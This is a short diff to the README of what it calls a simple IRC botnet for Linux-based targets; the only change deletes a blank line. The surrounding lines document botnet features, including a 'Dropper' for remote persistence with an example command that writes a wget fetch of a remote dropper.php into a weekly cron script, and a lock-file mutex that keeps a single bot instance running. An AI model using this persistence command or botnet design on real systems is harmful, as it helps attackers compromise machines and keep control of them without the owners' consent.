@@ -11,6 +11,5 @@ A simple IRC Botnet for linux-based targets
 ###Dropper
 Dropper allows remote persistence. Example:
 * `echo "wget http://target/dropper.php" > /etc/cron.weekly/persistence.sh`
-
 ###Mutex
 Lock file acts as a mutex to prevent multiple instances of the bot from running at once
